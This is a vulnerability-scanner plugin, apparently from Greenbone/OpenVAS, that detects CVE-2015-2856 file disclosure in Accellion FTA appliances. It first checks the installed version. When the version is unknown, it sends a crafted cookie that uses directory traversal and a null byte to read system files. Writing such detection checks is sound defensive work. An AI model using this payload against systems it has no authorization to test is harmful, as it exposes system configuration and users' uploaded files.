CPE = "cpe:/h:accellion:secure_file_transfer_appliance";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.106031" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2015-07-28 09:48:42 +0700 (Tue, 28 Jul 2015)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_cve_id( "CVE-2015-2856" );
	script_name( "Accellion FTA File Disclosure Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_accellion_fta_detect.sc", "os_detection.sc" );
	script_mandatory_keys( "accellion_fta/installed" );
	script_tag( name: "summary", value: "Accellion FTA is prone to a file disclosure vulnerability" );
	script_tag( name: "vuldetect", value: "Send a crafted GET request and check if we can read system files." );
	script_tag( name: "insight", value: "The vulnerability is triggered when a user-provided 'statecode'
  cookie parameter is appended to a file path that is processed as a HTML template. By prepending this
  cookie with directory traversal sequence and appending a NULL byte, any file readable by the web user
  can be exposed." );
	script_tag( name: "impact", value: "An attacker can read sensitive files, including the system
  configuration and files uploaded to the appliance by users." );
	script_tag( name: "affected", value: "Accellion FTA Version 9.11.200 and prior." );
	script_tag( name: "solution", value: "Upgrade to version 9.11.210 or later." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("version_func.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!infos = get_app_version_and_location( cpe: CPE, port: port, exit_no_version: FALSE )){
	exit( 0 );
}
version = infos["version"];
dir = infos["location"];
if( version ){
	if(version_is_less( version: version, test_version: "9.11.210" )){
		report = report_fixed_ver( installed_version: version, fixed_version: "9.11.210", install_path: dir );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
else {
	if(!dir){
		exit( 0 );
	}
	if(dir == "/"){
		dir = "";
	}
	files = traversal_files();
	for pattern in keys( files ) {
		file = files[pattern];
		host = http_host_name( port: port );
		url = dir + "/intermediate_login.html";
		cookie = "statecode=../../../../../" + file + "%00";
		useragent = http_get_user_agent();
		req = "GET " + url + " HTTP/1.1\r\n" + "Host: " + host + "\r\n" + "User-Agent: " + useragent + "\r\n" + "Cookie: " + cookie + "\r\n\r\n";
		buf = http_keepalive_send_recv( port: port, data: req );
		if(egrep( string: buf, pattern: pattern )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

